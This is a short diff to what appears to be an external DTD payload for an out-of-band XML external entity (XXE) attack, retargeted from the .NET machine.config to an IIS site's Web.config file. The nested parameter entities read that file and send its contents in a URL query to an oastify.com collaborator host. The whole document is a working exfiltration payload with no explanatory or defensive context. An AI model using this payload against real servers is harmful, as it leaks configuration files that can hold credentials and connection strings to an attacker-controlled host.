@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///c:/Windows/Microsoft.NET/Framework/v4.0.30319/Config/machine.config">
+<!ENTITY % file SYSTEM "file:///c:/inetpub/wwwroot/Web.config">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://c4hkqfzl7gadsrgyvo0tcranaeg54xsm.oastify.com/?webplanificacion=%file;'>">
 %eval;
 %exfil;
